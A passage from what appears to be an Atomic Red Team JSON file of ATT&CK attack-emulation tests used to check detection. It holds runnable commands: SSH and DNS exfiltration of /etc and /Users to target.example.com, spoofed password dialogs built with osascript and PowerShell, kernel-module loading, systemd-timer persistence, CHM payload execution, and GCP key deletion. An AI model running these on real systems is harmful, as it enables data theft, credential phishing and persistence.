team.\n\nIdentifies the deletion of an Identity and Access Management (IAM) service account key in Google Cloud Platform (GCP).\nEach service account is associated with two sets of public/private RSA key pairs that are used to authenticate. \nIf a key is deleted, the application will no longer be able to access Google Cloud resources using that key. A security best practice is to rotate your service account keys regularly.\n\nReference: https://github.com/elastic/detection-rules/blob/main/rules/integrations/gcp/impact_gcp_storage_bucket_deleted.toml\n", "supported_platforms": ["iaas:gcp"], "input_arguments": {"project_id": {"description": "ID of the GCP Project you to execute the command against.", "type": "string", "default": "atomic-test-1"}, "service_name": {"description": "The name of the service account.", "type": "string", "default": "atomic-service-account"}}, "executor": {"name": "sh", "elevation_required": false, "command": "gcloud config set project #{project_id}\nKEY=`gcloud iam service-accounts keys list --iam-account=#{service_name}@#{project_id}.iam.gserviceaccount.com --format=\"value(KEY_ID)\" --limit=1`\ngcloud iam service-accounts keys delete $KEY --iam-account=#{service_name}@#{project_id}.iam.gserviceaccount.com --quiet\n", "cleanup_command": "cd \"$PathToAtomicsFolder/T1098/src/T1098-17/\"\nterraform state rm google_service_account_key.key\nterraform destroy -auto-approve\n"}, "dependency_executor_name": "sh", "dependencies": [{"description": "Requires gcloud\n", "prereq_command": "if [ -x \"$(command -v gcloud)\" ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "echo \"Please Install Google Cloud SDK before running this atomic test : https://cloud.google.com/sdk/docs/install\"\n"}, {"description": "Check if user is logged in \n", "prereq_command": "gcloud config get-value account\n", "get_prereq_command": "gcloud auth login --no-launch-browser\n"}, {"description": "Check if terraform is installed.\n", "prereq_command": "terraform version\n", "get_prereq_command": "echo Please install the terraform.\n"}, {"description": "Create dependency resources using terraform\n", "prereq_command": "stat \"$PathToAtomicsFolder/T1098/src/T1098-17/terraform.tfstate\"\n", "get_prereq_command": "cd \"$PathToAtomicsFolder/T1098/src/T1098-17/\"\nterraform init\nterraform apply -auto-approve"}]}]}, "T1048": {"name": "Exfiltration Over Alternative Protocol", "technique_id": "attack-pattern--a19e86f8-1c0a-4fea-8407-23b73d615776", "external_id": "T1048", "data_components": ["Network Traffic Content", "Cloud Storage Access", "Network Connection Creation", "Application Log Content", "File Access", "Network Traffic Flow", "Command Execution"], "kill_chain_phases": ["exfiltration"], "data_source_platforms": [], "mitigations": ["course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c", "course-of-action--20f6a9df-37c4-4e20-9e47-025983b1b39d", "course-of-action--65401701-019d-44ff-b223-08d520bb0e7b", "course-of-action--86598de0-b347-4928-9eb0-0acbfc21908c", "course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317", "course-of-action--987988f0-cf86-4680-a875-2f6456ab2448"], "description": "Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.  \n\nAlternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Adversaries may also opt to encrypt and/or obfuscate these alternate channels. \n\n[Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048) can be done using various common operating system utilities such as [Net](https://attack.mitre.org/software/S0039)/SMB or FTP.(Citation: Palo Alto OilRig Oct 2016) On macOS and Linux <code>curl</code> may be used to invoke protocols such as HTTP/S or FTP/S to exfiltrate data from a system.(Citation: 20 macOS Common Tools and Techniques)\n\nMany IaaS and SaaS platforms (such as Microsoft Exchange, Microsoft SharePoint, GitHub, and AWS S3) support the direct download of files, emails, source code, and other sensitive information via the web console or [Cloud API](https://attack.mitre.org/techniques/T1059/009).", "atomic_tests": [{"name": "Exfiltration Over Alternative Protocol - SSH", "auto_generated_guid": "f6786cc8-beda-4915-a4d6-ac2f193bb988", "description": "Input a domain and test Exfiltration over SSH\n\nRemote to Local\n\nUpon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"domain": {"description": "target SSH domain", "type": "url", "default": "target.example.com"}}, "executor": {"command": "ssh #{domain} \"(cd /etc && tar -zcvf - *)\" > ./etc.tar.gz\n", "name": "sh"}}, {"name": "Exfiltration Over Alternative Protocol - SSH", "auto_generated_guid": "7c3cb337-35ae-4d06-bf03-3032ed2ec268", "description": "Input a domain and test Exfiltration over SSH\n\nLocal to Remote\n\nUpon successful execution, tar will compress /Users/* directory and password protect the file modification of `Users.tar.gz.enc` as output.\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"user_name": {"description": "username for domain", "type": "string", "default": "atomic"}, "password": {"description": "password for user", "type": "string", "default": "atomic"}, "domain": {"description": "target SSH domain", "type": "url", "default": "target.example.com"}}, "executor": {"command": "tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh #{user_name}@#{domain} 'cat > /Users.tar.gz.enc'\n", "name": "sh"}}, {"name": "DNSExfiltration (doh)", "auto_generated_guid": "c943d285-ada3-45ca-b3aa-7cd6500c6a48", "description": "DNSExfiltrator allows for transferring (exfiltrate) a file over a DNS request covert channel. This is basically a data leak testing tool allowing to exfiltrate data over a covert channel.\n!!! Test will fail without a domain under your control with A record and NS record !!! \nSee this github page for more details - https://github.com/Arno0x/DNSExfiltrator\n", "supported_platforms": ["windows"], "input_arguments": {"password": {"description": "Password used to encrypt the data to be exfiltrated", "type": "string", "default": "atomic"}, "domain": {"description": "The domain name to use for DNS requests", "type": "string", "default": "target.example.com"}, "ps_module": {"description": "DNSExfiltrator powershell ps_module", "type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\dnsexfil.ps1"}, "doh": {"description": "Google or CloudFlare DoH (DNS over HTTP) server", "type": "string", "default": "google"}, "time": {"description": "The time in milliseconds to wait between each DNS request", "type": "string", "default": "500"}, "encoding": {"description": "Set to '-b32' to use base32 encoding of data. Might be required by some DNS resolvers.", "type": "string", "default": null}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "DNSExfiltrator powershell file must exist on disk at specified location (#{ps_module})\n", "prereq_command": "if (Test-Path \"#{ps_module}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nIWR \"https://raw.githubusercontent.com/Arno0x/DNSExfiltrator/8faa972408b0384416fffd5b4d42a7aa00526ca8/Invoke-DNSExfiltrator.ps1\" -OutFile \"#{ps_module}\"\n"}], "executor": {"command": "Import-Module \"#{ps_module}\"\nInvoke-DNSExfiltrator -i \"#{ps_module}\" -d #{domain} -p #{password} -doh #{doh} -t #{time} #{encoding}\n", "name": "powershell"}}]}, "T1547.006": {"name": "Kernel Modules and Extensions", "technique_id": "attack-pattern--a1b52199-c8c5-438a-9ded-656f1d0888c6", "external_id": "T1547.006", "data_components": ["Kernel Module Load", "Command Execution", "File Modification", "File Creation", "Process Creation"], "kill_chain_phases": ["persistence", "privilege-escalation"], "data_source_platforms": [], "mitigations": ["course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db", "course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f", "course-of-action--a6a47a06-08fc-4ec4-bdc3-20373375ebb9"], "description": "Adversaries may modify the kernel to automatically execute programs on system boot. Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system.(Citation: Linux Kernel Programming)\u00a0\n\nWhen used maliciously, LKMs can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0).(Citation: Linux Kernel Module Programming Guide)\u00a0Common features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors, and enabling root access to non-privileged users.(Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used in macOS to load functionality onto a system similar to LKMs for Linux. Since the kernel is responsible for enforcing security and the kernel extensions run as apart of the kernel, kexts are not governed by macOS security policies. Kexts are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Kexts need to be signed with a developer ID that is granted privileges by Apple allowing it to sign Kernel extensions. Developers without these privileges may still sign kexts but they will not load unless SIP is disabled. If SIP is enabled, the kext signature is verified before being added to the AuxKC.(Citation: System and kernel extensions in macOS)\n\nSince macOS Catalina 10.15, kernel extensions have been deprecated in favor of System Extensions. However, kexts are still allowed as \"Legacy System Extensions\" since there is no System Extension for Kernel Programming Interfaces.(Citation: Apple Kernel Extension Deprecation)\n\nAdversaries can use LKMs and kexts to conduct [Persistence](https://attack.mitre.org/tactics/TA0003) and/or [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) on a system. Examples have been found in the wild, and there are some relevant open source projects as well.(Citation: Volatility Phalanx2)(Citation: CrowdStrike Linux Rootkit)(Citation: GitHub Reptile)(Citation: GitHub Diamorphine)(Citation: RSAC 2015 San Francisco Patrick Wardle)(Citation: Synack Secure Kernel Extension Broken)(Citation: Securelist Ventir)(Citation: Trend Micro Skidmap)", "atomic_tests": [{"name": "Linux - Load Kernel Module via insmod", "auto_generated_guid": "687dcb93-9656-4853-9c36-9977315e9d23", "description": "This test uses the insmod command to load a kernel module for Linux.\n", "supported_platforms": ["linux"], "input_arguments": {"module_name": {"description": "Name of the kernel module name.", "type": "string", "default": "T1547006"}, "module_path": {"description": "Folder used to store the module.", "type": "path", "default": "/tmp/T1547.006/T1547006.ko"}, "temp_folder": {"description": "Temp folder used to compile the code.", "type": "path", "default": "/tmp/T1547.006"}, "module_source_path": {"description": "Path to download Gsecdump binary file", "type": "url", "default": "PathToAtomicsFolder/T1547.006/src"}}, "dependency_executor_name": "bash", "dependencies": [{"description": "The kernel module must exist on disk at specified location\n", "prereq_command": "if [ -f #{module_path} ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "if [ ! -d #{temp_folder} ]; then mkdir #{temp_folder}; touch #{temp_folder}/safe_to_delete; fi;\ncp #{module_source_path}/* #{temp_folder}/\ncd #{temp_folder}; make\nif [ ! -f #{module_path} ]; then mv #{temp_folder}/#{module_name}.ko #{module_path}; fi;\n"}], "executor": {"command": "sudo insmod #{module_path}\n", "cleanup_command": "sudo rmmod #{module_name}\n[ -f #{temp_folder}/safe_to_delete ] && rm -rf #{temp_folder}\n", "name": "bash", "elevation_required": true}}, {"name": "MacOS - Load Kernel Module via kextload and kmutil", "auto_generated_guid": "f4391089-d3a5-4dd1-ab22-0419527f2672", "description": "This test uses the kextload and kmutil commands to load and unload a MacOS kernel module.\n", "supported_platforms": ["macos"], "input_arguments": {"module_path": {"description": "Folder used to store the module.", "type": "path", "default": "/Library/Extensions/SoftRAID.kext"}}, "dependency_executor_name": "bash", "dependencies": [{"description": "The kernel module must exist on disk at specified location\n", "prereq_command": "if [ -d #{module_path} ] ; then exit 0; else exit 1 ; fi\n", "get_prereq_command": "exit 1\n"}], "executor": {"command": "set -x\nsudo kextload #{module_path}\nkextstat 2>/dev/null | grep SoftRAID\nsudo kextunload #{module_path}\nsudo kmutil load -p #{module_path}\nkextstat 2>/dev/null | grep SoftRAID\nsudo kmutil unload -p #{module_path}\n", "name": "bash", "elevation_required": true}}, {"name": "MacOS - Load Kernel Module via KextManagerLoadKextWithURL()", "auto_generated_guid": "f0007753-beb3-41ea-9948-760785e4c1e5", "description": "This test uses the IOKit API to load a kernel module for macOS.\nHarcoded to use SoftRAID kext\n", "supported_platforms": ["macos"], "input_arguments": {"src_path": {"description": "Folder used to store the module.", "type": "path", "default": "PathToAtomicsFolder/T1547.006/src/macos_kextload.c"}, "exe_path": {"description": "Folder used to store the module.", "type": "path", "default": "/tmp/T1547006_iokit_loader"}}, "dependency_executor_name": "bash", "dependencies": [{"description": "The kernel module must exist on disk at specified location\n", "prereq_command": "if [ -f \"#{exe_path}\" ]; then exit 0 ; else exit 1; fi\n", "get_prereq_command": "cc -o #{exe_path} #{src_path} -framework IOKit -framework Foundation\n"}], "executor": {"command": "sudo #{exe_path}\nkextstat 2>/dev/null | grep SoftRAID\nsudo kextunload /Library/Extensions/SoftRAID.kext\n", "name": "bash", "elevation_required": true, "cleanup_command": "rm -f #{exe_path}\n"}}, {"name": "Snake Malware Kernel Driver Comadmin", "auto_generated_guid": "e5cb5564-cc7b-4050-86e8-f2d9eec1941f", "description": "The following Atomic Test will write an file, comadmin.dat, to disk. From the report, Snake's installer drops the kernel driver and a custom DLL which is used to load the driver into a\nsingle AES encrypted file on disk. Typically, this file is named \u201ccomadmin.dat\u201d and is stored in the %windows%\\system32\\Com directory. \nThis Atomic Test will write a hardcoded named file to disk in the com directory named comadmin.dat.\n[Snake Malware - CISA](https://media.defense.gov/2023/May/09/2003218554/-1/-1/0/JOINT_CSA_HUNTING_RU_INTEL_SNAKE_MALWARE_20230509.PDF)  \n", "supported_platforms": ["windows"], "executor": {"command": "$examplePath = Join-Path $env:windir \"system32\\Com\"; if (-not (Test-Path $examplePath)) { New-Item -ItemType Directory -Path $examplePath | Out-Null }; $exampleName = \"comadmin.dat\"; $exampleFullPath = Join-Path $examplePath $exampleName; $randomBytes = New-Object Byte[] 0x1000; (New-Object Random).NextBytes($randomBytes); [System.IO.File]::WriteAllBytes($exampleFullPath, $randomBytes)\n", "cleanup_command": "$examplePath = Join-Path $env:windir \"system32\\Com\"; $exampleName = \"comadmin.dat\"; $exampleFullPath = Join-Path $examplePath $exampleName; if (Test-Path $exampleFullPath) { Remove-Item $exampleFullPath -Force }\n", "name": "powershell", "elevation_required": true}}]}, "T1056.002": {"name": "GUI Input Capture", "technique_id": "attack-pattern--a2029942-0a85-4947-b23c-ca434698171d", "external_id": "T1056.002", "data_components": ["Command Execution", "Script Execution", "Process Creation"], "kill_chain_phases": ["collection", "credential-access"], "data_source_platforms": [], "mitigations": ["course-of-action--2a4f6c11-a4a7-4cb9-b0ef-6ae1bb3a718a"], "description": "Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)).\n\nAdversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) This type of prompt can be used to collect credentials via various languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002)(Citation: LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware)(Citation: Spoofing credential dialogs) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).(Citation: LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan 2015)(Citation: Spoofing credential dialogs) On Linux systems adversaries may launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e. [Unix Shell](https://attack.mitre.org/techniques/T1059/004)).(Citation: Spoofing credential dialogs) ", "atomic_tests": [{"name": "AppleScript - Prompt User for Password", "auto_generated_guid": "76628574-0bc1-4646-8fe2-8f4427b47d15", "description": "Prompt User for Password (Local Phishing)\nReference: http://fuzzynop.blogspot.com/2014/10/osascript-for-local-phishing.html\n", "supported_platforms": ["macos"], "executor": {"command": "osascript -e 'tell app \"System Preferences\" to activate' -e 'tell app \"System Preferences\" to activate' -e 'tell app \"System Preferences\" to display dialog \"Software Update requires that you type your password to apply changes.\" & return & return  default answer \"\" with icon 1 with hidden answer with title \"Software Update\"'\n", "name": "bash"}}, {"name": "PowerShell - Prompt User for Password", "auto_generated_guid": "2b162bfd-0928-4d4c-9ec3-4d9f88374b52", "description": "Prompt User for Password (Local Phishing) as seen in Stitch RAT. Upon execution, a window will appear for the user to enter their credentials.\n\nReference: https://github.com/nathanlopez/Stitch/blob/master/PyLib/askpass.py\n", "supported_platforms": ["windows"], "executor": {"command": "# Creates GUI to prompt for password. Expect long pause before prompt is available.    \n$cred = $host.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName)\n# Using write-warning to allow message to show on console as echo and other similar commands are not visable from the Invoke-AtomicTest framework.\nwrite-warning $cred.GetNetworkCredential().Password\n", "name": "powershell"}}, {"name": "AppleScript - Spoofing a credential prompt using osascript", "auto_generated_guid": "b7037b89-947a-427a-ba29-e7e9f09bc045", "description": "Prompt user for password without requiring permissions to send Apple events to System Settings.\nhttps://embracethered.com/blog/posts/2021/spoofing-credential-dialogs/\n", "supported_platforms": ["macos"], "executor": {"command": "PWD_SPOOF=$(osascript -e 'display dialog \"To perform a security update MacOS needs your passphrase.\" with title \"MacOS Security Update\" default answer \"\" with icon stop with hidden answer')\necho $PWD_SPOOF\n", "name": "bash"}}]}, "T1053.006": {"name": "Systemd Timers", "technique_id": "attack-pattern--a542bac9-7bc1-4da7-9a09-96f69e23cc21", "external_id": "T1053.006", "data_components": ["Process Creation", "File Modification", "Scheduled Job Creation", "Command Execution"], "kill_chain_phases": ["execution", "persistence", "privilege-escalation"], "data_source_platforms": [], "mitigations": ["course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317", "course-of-action--987988f0-cf86-4680-a875-2f6456ab2448", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f"], "description": "Adversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code. Systemd timers are unit files with file extension <code>.timer</code> that control services. Timers can be set to run on a calendar event or after a time span relative to a starting point. They can be used as an alternative to [Cron](https://attack.mitre.org/techniques/T1053/003) in Linux environments.(Citation: archlinux Systemd Timers Aug 2020) Systemd timers may be activated remotely via the <code>systemctl</code> command line utility, which operates over [SSH](https://attack.mitre.org/techniques/T1021/004).(Citation: Systemd Remote Control)\n\nEach <code>.timer</code> file must have a corresponding <code>.service</code> file with the same name, e.g., <code>example.timer</code> and <code>example.service</code>. <code>.service</code> files are [Systemd Service](https://attack.mitre.org/techniques/T1543/002) unit files that are managed by the systemd system and service manager.(Citation: Linux man-pages: systemd January 2014) Privileged timers are written to <code>/etc/systemd/system/</code> and <code>/usr/lib/systemd/system</code> while user level are written to <code>~/.config/systemd/user/</code>.\n\nAn adversary may use systemd timers to execute malicious code at system startup or on a scheduled basis for persistence.(Citation: Arch Linux Package Systemd Compromise BleepingComputer 10JUL2018)(Citation: gist Arch package compromise 10JUL2018)(Citation: acroread package compromised Arch Linux Mail 8JUL2018) Timers installed using privileged paths may be used to maintain root level persistence. Adversaries may also install user level timers to achieve user level persistence.", "atomic_tests": [{"name": "Create Systemd Service and Timer", "auto_generated_guid": "f4983098-bb13-44fb-9b2c-46149961807b", "description": "This test creates Systemd service and timer then starts and enables the Systemd timer \n", "supported_platforms": ["linux"], "input_arguments": {"path_to_systemd_service": {"description": "Path to systemd service unit file", "type": "path", "default": "/etc/systemd/system/art-timer.service"}, "path_to_systemd_timer": {"description": "Path to service timer file", "type": "path", "default": "/etc/systemd/system/art-timer.timer"}, "systemd_service_name": {"description": "Name of systemd service", "type": "string", "default": "art-timer.service"}, "systemd_timer_name": {"description": "Name of systemd service timer", "type": "string", "default": "art-timer.timer"}}, "executor": {"command": "echo \"[Unit]\" > #{path_to_systemd_service}\necho \"Description=Atomic Red Team Systemd Timer Service\" >> #{path_to_systemd_service}\necho \"[Service]\" >> #{path_to_systemd_service}\necho \"Type=simple\" >> #{path_to_systemd_service}\necho \"ExecStart=/bin/touch /tmp/art-systemd-timer-marker\" >> #{path_to_systemd_service}\necho \"[Install]\" >> #{path_to_systemd_service}\necho \"WantedBy=multi-user.target\" >> #{path_to_systemd_service}\necho \"[Unit]\" > #{path_to_systemd_timer}\necho \"Description=Executes Atomic Red Team Systemd Timer Service\" >> #{path_to_systemd_timer}\necho \"Requires=#{systemd_service_name}\" >> #{path_to_systemd_timer}\necho \"[Timer]\" >> #{path_to_systemd_timer}\necho \"Unit=#{systemd_service_name}\" >> #{path_to_systemd_timer}\necho \"OnCalendar=*-*-* *:*:00\" >> #{path_to_systemd_timer}\necho \"[Install]\" >> #{path_to_systemd_timer}\necho \"WantedBy=timers.target\" >> #{path_to_systemd_timer}\nsystemctl start #{systemd_timer_name}\nsystemctl enable #{systemd_timer_name}\nsystemctl daemon-reload\n", "cleanup_command": "systemctl stop #{systemd_timer_name}\nsystemctl disable #{systemd_timer_name}\nrm #{path_to_systemd_service}\nrm #{path_to_systemd_timer}\nsystemctl daemon-reload\n", "name": "bash"}}, {"name": "Create a user level transient systemd service and timer", "auto_generated_guid": "3de33f5b-62e5-4e63-a2a0-6fd8808c80ec", "description": "Schedule a user level transient task (will not survive a reboot) without having to create the .timer or .service files by using the systemd-run command. \n", "supported_platforms": ["linux"], "dependency_executor_name": "sh", "dependencies": [{"description": "Check if systemd-run exists on the machine\n", "prereq_command": "if [ -x \"$(command -v systemd-run)\" ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "echo \"Install systemd on the machine.\"; exit 1;\n"}], "executor": {"elevation_required": false, "command": "systemd-run --user --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo \"$(date) $(whoami)\" >>/tmp/log'\n", "cleanup_command": "systemctl --user stop Atomic-Red-Team.service\nsystemctl --user stop Atomic-Red-Team.timer\nrm /tmp/log\n", "name": "sh"}}, {"name": "Create a system level transient systemd service and timer", "auto_generated_guid": "d3eda496-1fc0-49e9-aff5-3bec5da9fa22", "description": "Schedule a system level transient task (will not survive a reboot) without having to create the .timer or .service files by using the systemd-run command. \n", "supported_platforms": ["linux"], "dependency_executor_name": "sh", "dependencies": [{"description": "Check if systemd-run exists on the machine\n", "prereq_command": "if [ -x \"$(command -v systemd-run)\" ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "echo \"Install systemd on the machine.\"; exit 1;\n"}], "executor": {"elevation_required": true, "command": "systemd-run --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo \"$(date) $(whoami)\" >>/tmp/log'\n", "cleanup_command": "systemctl stop Atomic-Red-Team.service\nsystemctl stop Atomic-Red-Team.timer\nrm /tmp/log\n", "name": "sh"}}]}, "T1218.001": {"name": "Compiled HTML File", "technique_id": "attack-pattern--a6937325-9321-4e2e-bb2b-3ed2d40b2a9d", "external_id": "T1218.001", "data_components": ["File Creation", "Command Execution", "Process Creation"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--21da4fd4-27ad-4e9c-b93d-0b9b14d02c96", "course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db"], "description": "Adversaries may abuse Compiled HTML files (.chm) to conceal malicious code. CHM files are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX. (Citation: Microsoft HTML Help May 2018) CHM content is displayed using underlying components of the Internet Explorer browser (Citation: Microsoft HTML Help ActiveX) loaded by the HTML Help executable program (hh.exe). (Citation: Microsoft HTML Help Executable Program)\n\nA custom CHM file containing embedded payloads could be delivered to a victim then triggered by [User Execution](https://attack.mitre.org/techniques/T1204). CHM execution may also bypass application application control on older and/or unpatched systems that do not account for execution of binaries through hh.exe. (Citation: MsitPros CHM Aug 2017) (Citation: Microsoft CVE-2017-8625 Aug 2017)", "atomic_tests": [{"name": "Compiled HTML Help Local Payload", "auto_generated_guid": "5cb87818-0d7c-4469-b7ef-9224107aebe8", "description": "Uses hh.exe to execute a local compiled HTML Help payload.\nUpon execution calc.exe will open\n", "supported_platforms": ["windows"], "input_arguments": {"local_chm_file": {"description": "Local .chm payload", "type": "path", "default": "PathToAtomicsFolder\\T1218.001\\src\\T1218.001.chm"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "The payload must exist on disk at specified location (#{local_chm_file})\n", "prereq_command": "if (Test-Path \"#{local_chm_file}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{local_chm_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.001/src/T1218.001.chm\" -OutFile \"#{local_chm_file}\"\n"}], "executor": {"command": "hh.exe \"#{local_chm_file}\"\n", "name": "command_prompt"}}, {"name": "Compiled HTML Help Remote Payload", "auto_generated_guid": "0f8af516-9818-4172-922b-42986ef1e81d", "description": "Uses hh.exe to execute a remote compiled HTML Help payload.\nUpon execution displays an error saying the file cannot be open\n", "supported_platforms": ["windows"], "input_arguments": {"remote_chm_file": {"description": "Remote .chm payload", "type": "url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.001/src/T1218.001.chm"}}, "executor": {"command": "hh.exe #{remote_chm_file}\n", "name": "command_prompt"}}, {"name": "Invoke CHM with default Shortcut Command Execution", "auto_generated_guid": "29d6f0d7-be63-4482-8827-ea77126c1ef7", "description": "Executes a CHM file with the default Shortcut Command method.", "supported_platforms": ["windows"], "input_arguments": {"chm_file_path": {"description": "Default path of CHM", "type": "string", "default": "Test.chm"}, "hh_file_path": {"description": "path of modified HH.exe", "type": "path", "default": "$env:windir\\hh.exe"}}, "dependencies": [{"description": "The AtomicTestHarnesses module must be installed and Invoke-ATHCompiledHelp must be exported in the module.", "prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {exit 1} else {exit 0}", "get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"}], "executor": {"command": "Invoke-ATHCompiledHelp -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}", "name": "powershell"}}, {"name": "Invoke CHM with InfoTech Storage Protocol Handler", "auto_generated_guid": "b4094750-5fc7-4e8e-af12-b4e36bf5e7f6", "description": "Executes a CHM file with the ITS protocol handler.", "supported_platforms": ["windows"], "input_arguments": {"hh_file_path": {"description": "path of modified HH.exe", "type": "path", "default": "$env:windir\\hh.exe"}, "infotech_storage_handler": {"description": "Default InfoTech Storage Protocol Handler", "type": "string", "default": "its"}, "chm_file_path": {"description": "Default path of CHM", "type": "string", "default": "Test.chm"}}, "dependencies": [{"description": "The AtomicTestHarnesses module must be installed and Invoke-ATHCompiledHelp must be exported in the module.", "prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {exit 1} else {exit 0}", "get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"}], "executor": {"command": "Invoke-ATHCompiledHelp -InfoTechStorageHandler #{infotech_storage_handler} -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}", "name": "powershell"}}, {"name": "Invoke CHM Simulate Double click", "auto_generated_guid": "5decef42-92b8-4a93-9eb2-877ddcb9401a", "description": "Executes a CHM file simulating a user double click.", "supported_platforms": ["windows"], "input_arguments": {"chm_file_path": {"description": "Default path of CHM", "type": "string", "default": "Test.chm"}}, "dependencies": [{"description": "The AtomicTestHarnesses module must be installed and Invoke-ATHCompiledHelp must be exported in the module.", "prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {exit 1} else {exit 0}", "get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"}], "executor": {"command": "Invoke-ATHCompiledHelp -SimulateUserDoubleClick -CHMFilePath #{chm_file_path}", "name": "powershell"}}, {"name": "Invoke CHM with Script Engine and Help Topic", "auto_generated_guid": "4f83adda-f5ec-406d-b318-9773c9ca92e5", "description": "Executes a CHM file with a defined script engine, ITS Protocol Handler, and help topic extension.", "supported_platforms": ["windows"], "input_arguments": {"topic_extension": {"description": "Default Help Topic", "type": "string", "default": "html"}, "hh_file_path": {"description": "path of modified HH.exe", "type": "path", "default": "$env:windir\\hh.exe"}, "infotech_storage_handler": {"description": "Default InfoTech Storage Protocol Handler", "type": "string", "default": "its"}, "script_engine": {"description": "Default Script Engine", "type": "string", "default": "JScript"}, "chm_file_path": {"description": "Default path of CHM", "type": "string", "default": "Test.chm"}}, "dependencies": [{"description": "The AtomicTestHarnesses module must be installed and Invoke-ATHCompiledHelp must be exported in the module.", "prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {exit 1} else {exit 0}", "get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"}], "executor": {"command": "Invoke-ATHCompiledHelp -ScriptEngine #{script_engine} -InfoTechStorageHandler #{infotech_storage_handler} -TopicExtension #{topic_extension} -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}", "name": "powershell"}}, {"name": "Invoke CHM Shortcut Command with ITS and Help Topic", "auto_generated_guid": "15756147-7470-4a83-87fb-bb5662526247", "description": "Executes a CHM file using the Shortcut Command method with a defined ITS Protocol Handler, and help topic extension.", "supported_platforms": ["windows"], "input_arguments": {"topic_extension": {"description": "Default Help Topic", "type": "string", "default": "html"}, "hh_file_path": {"description": "path of modified HH.exe", "type": "path", "default": "$env:windir\\hh.exe"}, "infotech_storage_handler": {"description": "Default InfoTech Storage Protocol Handler", "type": "string", "default": "its"}, "chm_file_path": {"description": "Default path of CHM", "type": "string", "default": "Test.chm"}}, "dependencies": [{"description": "The AtomicTestHarnesses module must be installed and Invoke-ATHCompiledHelp must be exported in the module.", "prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not 